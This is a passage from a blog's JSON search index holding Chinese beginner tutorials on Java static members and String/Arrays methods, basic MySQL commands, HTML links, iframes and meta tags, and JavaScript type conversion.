&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java字符串倒序","slug":"java00071字符串倒序","date":"2020-03-03T03:57:23.000Z","updated":"2020-03-03T04:01:34.019Z","comments":true,"path":"2020/03/03/java00071字符串倒序/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00071字符串倒序/","excerpt":"","text":"java字符串倒序 快捷键技巧: 数组倒序遍历 数组名.forr自动生成: 123for (int i = arrayName.length-1; i &gt;= 0 ; i--) &#123;&#125; 1234567891011121314package xiaochenyan.top.Demo;import java.util.Arrays;public class Main17&#123; public static void main(String[] args) &#123; String[] str = &#123;\"aaa\",\"ddd\",\"ccc\",\"bbb\"&#125;; //先将字符串升序 Arrays.sort(str); //然后从后往前遍历数组 for (int i = str.length-1; i &gt;= 0 ; i--) &#123; System.out.println(str[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数组工具类Arrays","slug":"java00070数组工具类Arrays","date":"2020-03-03T03:44:05.000Z","updated":"2020-03-03T03:56:38.395Z","comments":true,"path":"2020/03/03/java00070数组工具类Arrays/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00070数组工具类Arrays/","excerpt":"","text":"java数组工具类Arrays java.util.Arrays是一个与数组相关的工具类,里面提供了大量静态方法,用来实现数组常见的操作. public static String toString(数组): 将参数数组变成字符串(按照默认格式: [元素1,元素2,元素3,…]) public static void sort(数组),按照默认升序(从小到大)对数组元素进行排序. 备注: 1.如果是数组,sort默认按照升序从小到大 2.如果是字符串,sort默认按照字母升序 3.如果是自定义的类型,那么这个自定义的类需要有Comparable或者Comparator接口支持. 1234567891011121314151617package xiaochenyan.top.Demo;import java.util.Arrays;public class Main18&#123; public static void main(String[] args) &#123; String[] str = &#123;\"aaa\",\"ccc\",\"bbb\"&#125;; int[] num = &#123;1,3,5,2,6,34,24&#125;; //str数组排序 Arrays.sort(str); //将str数组转换为字符串 System.out.println(Arrays.toString(str)); //int数组排序 Arrays.sort(num); //将int数组转换为字符串 System.out.println(Arrays.toString(num)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态代码块","slug":"java00069静态代码块","date":"2020-02-29T12:20:39.000Z","updated":"2020-02-29T12:31:17.494Z","comments":true,"path":"2020/02/29/java00069静态代码块/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/29/java00069静态代码块/","excerpt":"","text":"静态代码块 静态代码块格式: 12345public class 类名&#123; static&#123; //静态代码块内容 &#125;&#125; 特点: 当第一次用到本类时,静态代码块执行唯一的一次 静态内容总是优先于非静态,所以静态代码块比构造方法先执行. 静态代码块用途: 用来一次性的对静态成员变量进行赋值. 12345public class demo01&#123; public static void main(String[] args) &#123; JinTaiDaiMaKuai one = new JinTaiDaiMaKuai(); &#125;&#125; 123456789public class JinTaiDaiMaKuai&#123; static &#123; System.out.println(\"我是静态代码块\"); &#125; public JinTaiDaiMaKuai() &#123; System.out.println(\"我是构造函数\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static的内存图","slug":"java00068静态static的内存图","date":"2020-02-27T13:28:50.000Z","updated":"2020-02-27T13:29:52.382Z","comments":true,"path":"2020/02/27/java00068静态static的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/java00068静态static的内存图/","excerpt":"","text":"静态static的内存图","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"MYSQL常见命令","slug":"mysql006MYSQL常见命令","date":"2020-02-26T23:03:01.000Z","updated":"2020-02-26T23:20:14.392Z","comments":true,"path":"2020/02/27/mysql006MYSQL常见命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql006MYSQL常见命令/","excerpt":"","text":"MYSQL常见命令 1.查看当前所有的数据库 show databases; 2.打开指定的库 use 库名; 3.查看当前库的所有表 show tables; 4.查看其他库的所有表 show tables from 库名; 5.创建表 12345create table 表名( 列名 列类型, 列名 列类型, ...); 6.查看表结构 desc 表名; 7.查看数据库版本 方式一:登录到mysql服务端 select version(); 方式二:没有登录到mysql服务端 mysql --version或者mysql -V","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL服务端的登录和退出","slug":"mysql005MYSQL服务端的登录和退出","date":"2020-02-26T22:49:57.000Z","updated":"2020-02-26T23:01:19.621Z","comments":true,"path":"2020/02/27/mysql005MYSQL服务端的登录和退出/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql005MYSQL服务端的登录和退出/","excerpt":"","text":"MYSQL服务端的登录和退出 1.用mysql自带的客户端 直接输入密码就可以进入数据库管理系统了 2.使用cmd登录 1234567891011121314151617181920// -h 连接的主机 -P 代表端口号//第一种方式mysql -h 主机名 -P 端口号 -u 用户名 -p// mysql -h localhost -P 3306 -u root -p//第二种方式mysql -h 主机名 -P 端口号 -u 用户名 -p密码//mysql -h localhost -P 3306 -u root -p123//-p后面没有空格//第三种方式//在服务端本机登录可以省略mysql -u 用户名 -pmysql -u 用户名 -p密码 退出 用exit命令或者Ctrl + C","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL服务的启动和停止","slug":"mysql004MYSQL服务的启动和停止","date":"2020-02-26T22:43:46.000Z","updated":"2020-02-26T22:49:09.711Z","comments":true,"path":"2020/02/27/mysql004MYSQL服务的启动和停止/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql004MYSQL服务的启动和停止/","excerpt":"","text":"MYSQL服务的启动和停止 用管理员身份打开CMD命令 停止服务 1net stop 数据库服务名 开启服务 1net start 数据库服务名 第二种方式: 在图形服务管理中找到服务名,设置为开启状态","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"配置文件介绍","slug":"mysql003配置文件介绍","date":"2020-02-26T22:29:44.000Z","updated":"2020-02-26T22:42:43.192Z","comments":true,"path":"2020/02/27/mysql003配置文件介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql003配置文件介绍/","excerpt":"","text":"配置文件介绍 my.ini文件是数据库配置文件 客户端字符集 服务端配置: 服务端端口 服务端安装目录 数据库的管理文件目录 字符集 数据库存储引擎 语法模式 最大连接数 修改完之后,数据库服务要重启","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL软件安装","slug":"mysql002MYSQL软件安装","date":"2020-02-26T21:26:20.000Z","updated":"2020-02-26T21:32:01.056Z","comments":true,"path":"2020/02/27/mysql002MYSQL软件安装/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql002MYSQL软件安装/","excerpt":"","text":"MYSQL软件安装","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"数据库的相关概念","slug":"mysql001数据库的相关概念","date":"2020-02-24T01:59:40.000Z","updated":"2020-02-24T02:04:20.976Z","comments":true,"path":"2020/02/24/mysql001数据库的相关概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/24/mysql001数据库的相关概念/","excerpt":"","text":"数据库的相关概念","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"静态static关键字修饰成员方法","slug":"java00067静态static关键字修饰成员方法","date":"2020-02-18T23:57:16.000Z","updated":"2020-02-19T00:37:04.747Z","comments":true,"path":"2020/02/19/java00067静态static关键字修饰成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00067静态static关键字修饰成员方法/","excerpt":"","text":"静态static关键字修饰成员方法 1.一旦使用static修饰成员方法,那么这就成为了静态方法. 2.静态方法不属于对象,而是属于类的. 3.如果没有用static关键字,那么首先必须先创建对象,然后通过对象才能使用成员方法. 4.对于静态方法来说,可以通过对象名进行调用,也可以通过类名来调用.但推荐使用类名来调用. 5.如果是使用对象名来调用静态成员变量,在编译之后也会被javac翻译成为类名.静态方法名 6.如果有了static关键字,那么不需要创建对象,直接就能通过类名称来使用它 7.无论是成员变量还是成员方法,如果有了static,都推荐使用类名称进行调用. 8.静态成员变量:类名称.静态变量; 9.静态方法:类名称.静态方法(); 10.对于在本类当中的静态方法,可以省略类名称. 注意: 1.静态不能直接访问非静态. 原因:因为在内存当中,是先有的静态内容,后有的非静态内容. 2.静态方法不能使用this. 原因:this代表当前对象,通过谁调用的方法,谁就是对象. 123456789101112131415public class Main16&#123; public static void main(String[] args) &#123; Student2 stu = new Student2(\"小明\"); Student2.room = \"101课室\"; //使用成员方法 stu.showVar(); //使用静态成员方法 Student2.showStaticVar(); stu.showStaticVar();//不推荐使用对象名调用静态成员方法 &#125;&#125; 12345678910111213141516171819202122232425262728293031//创建一个Student2类public class Student2&#123; String name;/*====================================================================*/ public static String room; public Student2() &#123; &#125; public Student2(String name) &#123; this.name = name; &#125; /*====================================================================*/ //非静态成员方法 public void showVar() &#123; System.out.println(\"名字: \" + this.name); System.out.println(\"年龄: \" + Student2.room); showStaticVar(); //在本类中可以直接使用静态成员方法,不用加类名 Student2.showStaticVar(); //加类名使用静态成员方法 &#125; //静态成员方法 //属于类,不属于对象 public static void showStaticVar()&#123; System.out.println(\"年龄: \" + Student2.room); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static关键字修饰成员变量","slug":"java00066静态static关键字修饰成员变量","date":"2020-02-18T22:58:40.000Z","updated":"2020-02-19T00:52:12.961Z","comments":true,"path":"2020/02/19/java00066静态static关键字修饰成员变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00066静态static关键字修饰成员变量/","excerpt":"","text":"静态static关键字修饰成员变量 如果一个成员变量使用了static关键字,那么这个变量就不再属于对象自己,而是属于所在的类.多个对象共享同一份数据. 格式: 123static int number;public static String name;private static float jiGe; 使用静态成员变量: 类名.静态成员变量; 对象名.静态成员变量; 修改静态成员变量的值: 类名.静态成员变量 = 1; 对象名.静态成员变量 = 1; 12345678910111213141516171819202122232425262728public class Main15&#123; public static void main(String[] args) &#123; Student one = new Student(\"张三丰\",102); Student two = new Student(\"张无极\",23); Student three = new Student(\"赵敏\",18); Student four = new Student(\"周芷若\",18); //使用静态成员变量 Student.room = \"101教师\"; System.out.println(\"名字:\" + one.getName() + \" 年龄:\" + one.getAge() + \" 课室\" + one.room + \" 学号:\" + one.getId() ); System.out.println(\"名字:\" + two.getName() + \" 年龄:\" + two.getAge() + \" 课室\" + two.room + \" 学号:\" + two.getId() ); System.out.println(\"名字:\" + three.getName() + \" 年龄:\" + three.getAge() + \" 课室\" + three.room + \" 学号:\" + three.getId() ); System.out.println(\"名字:\" + four.getName() + \" 年龄:\" + four.getAge() + \" 课室\" + four.room + \" 学号:\" + four.getId() ); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738public class Student&#123; private String name; private int age; public static String room;//公开的静态成员变量 private int id; private static int countIdNumber;//私有的静态成员变量 public int getId() &#123; return id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public Student(String name, int age) &#123; this.name = name; this.age = age; id = ++countIdNumber; &#125; public Student() &#123; id = ++countIdNumber; &#125;&#125; 快捷键: ​ 数字.fori按下回车或tab键之后,会自动生成一个循环6次的for循环语句 1234for(int i = 0;i &lt; 6;i++)&#123;&#125; 数组名.fori 1234for(int i = 0;i &lt; 数组名.lenght;i++)&#123;&#125; 变量名.sout 1System.out.println(变量名); 对象.sout 1System.out.println(对象名); 对象名.成员变量.sout 1System.out.println(对象名.成员变量); 数组名[i].sout 1System.out.println(数组名[i]);","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static关键字概述","slug":"java00065静态static关键字概述","date":"2020-02-18T22:52:09.000Z","updated":"2020-02-18T23:08:07.752Z","comments":true,"path":"2020/02/19/java00065静态static关键字概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00065静态static关键字概述/","excerpt":"","text":"静态static关键字概述 static关键字表示多个对象共用一个静态成员变量 这个成员变量属于类.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"按指定格式拼接字符练习","slug":"java00064按指定格式拼接字符-练习","date":"2020-02-18T21:26:59.000Z","updated":"2020-02-18T21:31:44.331Z","comments":true,"path":"2020/02/19/java00064按指定格式拼接字符-练习/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00064按指定格式拼接字符-练习/","excerpt":"","text":"按指定格式拼接字符练习 12345678910111213141516171819202122public class demo13&#123; public static void main(String[] args) &#123; int[] intArray = &#123;1,2,3,4&#125;; String str = pingJieZiFuChuan(intArray); System.out.println(str); &#125; public static String pingJieZiFuChuan(int[] intArray) &#123; String str = \"[\"; for (int i = 0; i &lt; intArray.length; i++) &#123; if(i == intArray.length - 1) &#123; str += \"word\" + intArray[i] + \"]\"; &#125;else&#123; str += \"word\" + intArray[i] +\"#\"; &#125; &#125; return str; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"统计输入的字符串中的各种字符次数","slug":"java00063统计输入的字符串中的各种字符次数","date":"2020-02-18T21:02:24.000Z","updated":"2020-02-18T21:09:27.250Z","comments":true,"path":"2020/02/19/java00063统计输入的字符串中的各种字符次数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00063统计输入的字符串中的各种字符次数/","excerpt":"","text":"统计输入的字符串中的各种字符次数 1234567891011121314151617181920212223242526272829303132333435363738import java.util.Scanner;public class demo14&#123; public static void main(String[] args) &#123; String str ; int countNumber = 0; int countOther = 0; int countLower = 0; int countUpper = 0; Scanner sc = new Scanner(System.in); System.out.println(&quot;请输入字符串:&quot;); str = sc.next(); char[] chs = str.toCharArray(); for (int i = 0; i &lt; chs.length; i++) &#123; char ch = chs[i]; if(ch &gt;= &apos;a&apos; &amp;&amp; ch &lt;= &apos;z&apos;) &#123; countLower++; &#125;else if(ch &gt;= &apos;A&apos; &amp;&amp; ch &lt;= &apos;Z&apos; ) &#123; countUpper++; &#125;else if(ch &gt;= &apos;0&apos; &amp;&amp; ch &lt;= &apos;9&apos; )&#123; countNumber++; &#125;else &#123; countOther++; &#125; &#125; System.out.println(&quot;大写字母个数:&quot; + countUpper); System.out.println(&quot;小写字母个数:&quot; + countLower); System.out.println(&quot;数字个数:&quot; + countNumber); System.out.println(&quot;其他字符个数:&quot; + countOther); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的分割方法","slug":"java00059字符串的分割方法","date":"2020-02-18T20:17:16.000Z","updated":"2020-02-18T20:26:55.295Z","comments":true,"path":"2020/02/19/java00059字符串的分割方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00059字符串的分割方法/","excerpt":"","text":"字符串的分割方法 分割字符串的方法: public String[] split(String regex);按照参数的规则,将字符串切分成为若干部分. 注意事项: split方法的参数其实是一个&quot;正则表达式&quot;. 如果用英文句点&quot;.&quot;进行切分,必须写&quot;\\\\.&quot;(两个反斜杠) 123456789101112131415161718public class demo12&#123; public static void main(String[] args) &#123; String str1 = \"123,123,12w\"; String str2 = \"aaa.bbb.ccc\"; String[] strArray = str1.split(\",\"); for (int i = 0; i &lt; strArray.length; i++) &#123; System.out.println(strArray[i]); &#125; System.out.println(\"=========================\"); String[] str2Array = str2.split(\"\\\\.\"); for (int i = 0; i &lt; str2Array.length; i++) &#123; System.out.println(str2Array[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的转换相关方法","slug":"java00058字符串的转换相关方法","date":"2020-02-18T20:05:25.000Z","updated":"2020-02-18T20:10:56.491Z","comments":true,"path":"2020/02/19/java00058字符串的转换相关方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00058字符串的转换相关方法/","excerpt":"","text":"字符串的转换相关方法 String当中与转换相关的常用方法: public char[] toCharArray();将当前字符串拆分成为字符数组作为返回值. public byte[] getBytes();获得当前字符串底层的字节数组 public String replace(CharSequence oldString,CharSequence newString); 将所有出现的老字符串替换成为新的字符串,返回替换之后的结果为新字符串. 12345678910111213141516171819202122public class demo11&#123; public static void main(String[] args) &#123; String str1 = \"我爱你\"; char[] chArray = str1.toCharArray();//将str1转换为char[]数组 byte[] by = str1.getBytes();//将str1转换为byte[]数组; System.out.println(chArray[0]); for (int i = 0; i &lt; by.length; i++) &#123; System.out.println(by[i]); &#125; System.out.println(\"========================\"); String str2 = \"你麻痹的,你会不会啊\"; String str3 = str2.replace(\"麻痹\", \"**\");//str2.replace(要替换的字符串,替换的字符); System.out.println(str3); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的截取方法","slug":"java00057字符串的截取方法","date":"2020-02-18T19:26:50.000Z","updated":"2020-02-18T19:46:16.714Z","comments":true,"path":"2020/02/19/java00057字符串的截取方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00057字符串的截取方法/","excerpt":"","text":"字符串的截取方法 public String substring(int index);截取从参数位置一直到字符串末尾,返回新字符串. public String substring(int begin,int end); 截取从begin开始,一直到end结束. 备注:[begin,end),包含左边,不包含右边 快捷键: 按住ctrl + shift + 方向左右键可以多选字符串 按住shift + 方向左右键可以单选多个字符 123//改变String 对象的内容,其实是改变字符串的地址String str1 = \"123\";str1 = \"456\"; 12345678910111213141516public class demo10&#123; public static void main(String[] args) &#123; String str1 = \"123456\"; String str2 = str1.substring(2);//从第2号元素开始截取,一直到结束 System.out.println(str2); str2 = str1.substring(3,6); System.out.println(str2);//从第3号元素开始,一直到第6号元素.不包含第6号元素; str1 = \"11111\"; //0x1111 str1 = \"22222\"; //0x8888 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"超链接","slug":"html-css00014超链接","date":"2020-02-18T01:46:04.000Z","updated":"2020-03-03T13:12:11.709Z","comments":true,"path":"2020/02/18/html-css00014超链接/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00014超链接/","excerpt":"","text":"超链接 使用超链接可以让我们从一个页面跳转到另一个页面 使用a标签来创建一个超链接: 属性: href:指向链接跳转的目标地址,可以写一个相对路径也可以写一个完整地址. target:可以用来指定打开链接的位置 可选值: _self:表示在当前窗口中打开(默认值) _blank:在新的窗口中打开链接 ​ 123&lt;!-- 超链接 --&gt;&lt;a href=\"http://www.baidu.com\"&gt;我是一个超链接&lt;/a&gt;&lt;a href=\"demo.html\"&gt; 我是一个超链接&lt;/a&gt; 在新窗口打开页面 1234&lt;!-- 在本窗口跳转 --&gt;&lt;a href=\"http://www.baidu.com\" target=\"_self\"&gt;我是一个超链接&lt;/a&gt;&lt;!-- 在新窗口打开 --&gt;&lt;a href=\"demo.html\" target=\"_blank\"&gt; 我是一个超链接&lt;/a&gt; 可以在内联框架标签中设置一个name属性值,链接将会在指定的内联框架中打开 123&lt;!-- 内联框架中打开 --&gt;&lt;iframe src=\"demo.html name=\"tom\"&gt;&lt;/iframe&gt;&lt;a href=\"demo.html\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; center标签中的内容,会默认在页面中居中显示 如果我们要内容居中显示,要把内容都放到center标签中 123456&lt;!-- 居中显示 --&gt;&lt;center&gt; a aaaaaa aaaaaa&lt;/center&gt; 如果href中地址不确定,可以先用#代替 如果将链接地址设置为#,点击后会自动回到页面顶部 12&lt;!--回到页面顶部--&gt;&lt;a href=\"#\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; html中有一个属性,每一个元素都可以设置,该属性可以作为标签的唯一标识 这个属性就是id,id属性在同一个页面中只能有一个,不能有重复 跳转到id为bottom的元素所在的位置 直接在href中写 #id属性值 12345&lt;a href=\"#bottom\"&gt;回到底部&lt;/a&gt;&lt;!--跳到这里--&gt;&lt;a id=\"bottom\" href=\"https://www.baidu.com\"&gt;哈哈哈&lt;/a&gt; 发送邮件的超链接,点击链接以后可以自动打开计算机中默认的邮件客户端 当点击这个链接时会自动打开计算机中默认的邮件客户端,并且将收件人设置为mailto后的邮箱地址. 格式: &lt;a href=&quot;mailto:邮箱地址&quot; &gt;联系我们&lt;a&gt; 1&lt;a href=\"mailto:123@qq.com\" &gt;联系我们&lt;a&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"内联框架","slug":"html-css00013内联框架","date":"2020-02-17T22:29:31.000Z","updated":"2020-02-17T22:39:32.645Z","comments":true,"path":"2020/02/18/html-css00013内联框架/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00013内联框架/","excerpt":"","text":"内联框架 使用内联框架可以引入一个外部的页面. 使用iframe来创建一个内联框架 属性: src:指向一个外部页面的路径,可以使用相对路径 width:设置宽度 height:设置高度 不会按比例缩放 name:可以为内联框架指定一个name属性(给框架起名字) 在现实开发中不推荐使用内联框架,因为内联框架中的内容不会被搜索引擎所检索,但可以在内网使用; 一般放在body标签内 格式:&lt;iframe scr=&quot;目标路径&quot; name=&quot;名字&quot;&gt; 1&lt;iframe scr=\"demo.html\" name=\"tom\"&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"xHtml的语法规范","slug":"html-css00012xHtml的语法规范","date":"2020-02-17T21:25:32.000Z","updated":"2020-02-18T02:26:50.768Z","comments":true,"path":"2020/02/18/html-css00012xHtml的语法规范/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00012xHtml的语法规范/","excerpt":"","text":"xHtml的语法规范 浏览器会尽最大的努力正确解析错误的语法,你所有的不符合语法规范的内容,浏览器都会为你自动修正,但是有些情况会修正错误. 1.HTML中不区分大小写,但是我们一般都使用小写 1&lt;p&gt;aaaaaaaaa&lt;/p&gt; 2.HTML中的注释不能嵌套 1234567891011&lt;!--正确写法--&gt;=================================================错误写法&lt;!-- &lt;!-- --&gt;--&gt; 3.HTML标签必须结构完整,要么成对出现,要么自结束标签. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaaa&lt;/p&gt; &lt;!--错误写法--&gt;&lt;p&gt;asdfdsf 4.HTML标签可以嵌套,但是不能交叉嵌套. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaaaaa&lt;/p&gt;&lt;/font&gt; 5.HTML标签中的属性必须有值,且值必须加引号(双引号,单引号都可以) 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"meta标签","slug":"html-css00011meta标签","date":"2020-02-17T21:09:02.000Z","updated":"2020-02-18T02:23:00.419Z","comments":true,"path":"2020/02/18/html-css00011meta标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00011meta标签/","excerpt":"","text":"meta标签 使用meta标签还可以用来设置网页的关键字 格式:&lt;meta name=&quot;keywords&quot; content = &quot;关键字&quot; /&gt; 如果是多个关键字,就用逗号隔开. 关键字是被搜索引擎识别的. 1&lt;meta name=\"keywords\" content=\"HTML5,JavaScript,前端,Java\" /&gt; 使用meta标签用来指定网页的描述 搜索引擎在检索页面时,会同时检索页面中的关键字和描述,但是这两个值不会影响页面在搜索引擎中的排名. 格式:&lt;meta name=&quot;description&quot; content=&quot;描述信息&quot; /&gt; 1&lt;meta name=\"description\" content=\"发布h5,js前端等相关信息\" /&gt; 使用meta可以用来做请求重定向(页面跳转). 格式:&lt;meta http-equiv=&quot;refresh&quot; content=&quot;秒数;url=目标路径&quot; /&gt; 目标路径可以是相对地址 绝对路径要在开头加上https://或http:// 1&lt;meta http-equiv=\"refresh\" content=\"5;http://www.baidu.com\" /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"算数运算符","slug":"JS00015算数运算符","date":"2020-02-17T09:11:12.000Z","updated":"2020-03-01T10:10:49.980Z","comments":true,"path":"2020/02/17/JS00015算数运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00015算数运算符/","excerpt":"","text":"算数运算符 运算符也叫操作符 通过运算符可以对一个或多个值进行运算,并获取运算结果 比如:typeof就是运算符,可以来获得一个值的类型,它会将该值的类型以字符串的形式返回number string boolean undefined object 1234567console.log(typeof(\"123\"));//stringconsole.log(typeof(1));//numberconsole.log(typeof(1.6));//numberconsole.log(typeof(null));//objectconsole.log(typeof(undefined));//undefinedconsole.log(typeof(NaN));//NaNconsole.log(typeof(true));//boolean 算数运算符: + - * / % 当对非Number类型的值进行运算时,会将这些值转换为Number然后在运算. 任何值和NaN做运算都得NaN 1. +可以对两个值进行加法运算,并将结果返回. 如果对两个字符串做加法,则会拼接在一起 任何值和字符串做加法运算,都会先转换为字符串,然后再拼接 我们可以利用这一点特性来为任何数据类型做String转换. 这是一种隐式类型转换,实际上也是调用了String() 1234567891011121314var a = 123;a = 123 + 2;//125a = true + 1;//2a = true + false;//1a = 2 + null;//2a = 2 + NaN;//NaNa = \"aaa\" + \"bbb\";//aaabbba = 100 + \"aa\";//100aa 2. -可以对两个值进行减法运算,并将结果返回 任何数据类型和数字做减法都会先转换为Number 123456var a = 100;a = 100 - 1;//99a = 100 - \"1\";//99console.log(a - NaN);//NaNconsole.log(a - null);//100console.log(a - undefined);//NaN 3. *可以对两个值进行乘法运算,并将结果返回 任何数据类型和数字做乘法都会先转换为Number 123456var a = 100;a = 100 * 1;//100a = 100 * \"1\";//100console.log(a * NaN);//NaNconsole.log(a * null);//0console.log(a * undefined);//NaN 4. /可以对两个值进行除法运算,并将结果返回 任何数据类型和数字做除法都会先转换为Number 可以通过为一个值0 * &quot; 1 &quot; /1来将其转换为Number 原理和Number()函数一样,使用起来更加简单 1234567var a = 100;a = 100 / 1;//100a = 100 / \"1\";//100console.log(a / NaN);//NaNconsole.log(a / null);//出错 0不能做除数console.log(a / undefined);//NaNconsole.log(a + \"1\");//101 5.%取模运算符(取余数) 12var a = 10;a = a % 9;//1","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"转换为Boolean","slug":"JS00014转换为Boolean","date":"2020-02-17T08:58:33.000Z","updated":"2020-03-01T10:09:18.316Z","comments":true,"path":"2020/02/17/JS00014转换为Boolean/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00014转换为Boolean/","excerpt":"","text":"转换为Boolean 将其他类型转换为Boolean 使用Boolean()函数 除了0和NaN,其他的都为true 字符串转布尔,除了空串,其余的都是true. null和undefined都会转换为false 对象也会转换为true 12345678910var a = 123;var b = 0;var c = NaN;var d = \"\";console.log(Boolean(a));//trueconsole.log(Boolean(b);//falseconsole.log(Boolean(c));//falseconsole.log(Boolean(d));//falseconsole.log(Boolean(null));//falseconsole.log(Boolean(undefined));//false","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"其他进制的数字","slug":"JS00013其他进制的数字","date":"2020-02-17T08:33:11.000Z","updated":"2020-02-17T08:57:07.851Z","comments":true,"path":"2020/02/17/JS00013其他进制的数字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00013其他进制的数字/","excerpt":"","text":"其他进制的数字 在JS中,如果需要表示16进制的数字,则需要以0x开头. 12var a = 0x12334;console.log(a); 如果需要表示8进制,则用0开头 12var a = 010;console.log(a); 如果需要表示二进制,用0b开头.但不是所有浏览器都支持. 12var a = 0b010;console.log(a); 有些浏览器会把&quot;070&quot;这种字符串当成10进制 1234var a = \"070\";parseInt(a);//有些浏览器会把这种字符串当成10进制//解决方法parseInt(a,8);","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-Number","slug":"JS00012强制类型转换Number","date":"2020-02-17T07:48:04.000Z","updated":"2020-03-01T10:13:13.981Z","comments":true,"path":"2020/02/17/JS00012强制类型转换Number/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00012强制类型转换Number/","excerpt":"","text":"强制类型转换-Number 将其他数据类型转换为Number 